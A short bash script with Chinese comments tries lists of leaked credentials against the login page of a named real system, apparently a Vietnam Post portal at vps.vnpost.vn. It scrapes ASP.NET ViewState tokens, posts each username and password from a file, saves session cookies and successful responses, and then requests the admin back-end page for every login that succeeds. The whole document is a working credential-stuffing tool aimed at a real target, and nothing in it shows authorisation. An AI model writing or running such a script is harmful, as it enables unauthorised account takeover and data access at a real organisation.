#!/bin/bash
# 测试VCKV泄露凭证

URL="http://vps.vnpost.vn/vckv/Login.aspx"

echo "=== 测试VCKV系统泄露凭证 ==="

# 获取ViewState
echo "[*] 获取ViewState..."
VIEWSTATE=$(curl -sk "$URL" | grep -oP '(?<=__VIEWSTATE" value=")[^"]+')
VIEWSTATEGENERATOR=$(curl -sk "$URL" | grep -oP '(?<=__VIEWSTATEGENERATOR" value=")[^"]+')

echo "ViewState: ${VIEWSTATE:0:50}..."

# 测试凭证
while IFS=: read -r user pass; do
    echo ""
    echo "[*] 测试: $user / $pass"
    
    response=$(curl -sk "$URL" \
        -X POST \
        -d "__VIEWSTATE=$VIEWSTATE" \
        -d "__VIEWSTATEGENERATOR=$VIEWSTATEGENERATOR" \
        -d "txtUserName=$user" \
        -d "txtPassword=$pass" \
        -d "btnLogin=Đăng nhập" \
        -c /tmp/vckv_cookies_$user.txt)
    
    # 检查登录结果
    if echo "$response" | grep -qi "logout\|đăng xuất\|thoát\|welcome"; then
        echo "✅ 成功！$user:$pass"
        echo "$response" > /tmp/vckv_success_$user.html
        echo "响应已保存到 /tmp/vckv_success_$user.html"
        
        # 测试访问后台
        echo "[*] 测试访问后台..."
        curl -sk "http://vps.vnpost.vn/vckv/Index.aspx" \
            -b /tmp/vckv_cookies_$user.txt | head -50
        
    elif echo "$response" | grep -qi "error\|sai\|wrong\|invalid"; then
        echo "❌ 失败: 密码错误"
    else
        echo "⚠️  未知响应(长度: $(echo "$response" | wc -c))"
        echo "$response" | head -20
    fi
    
    sleep 1
done < vckv_creds.txt

echo ""
echo "=== 测试完成 ==="
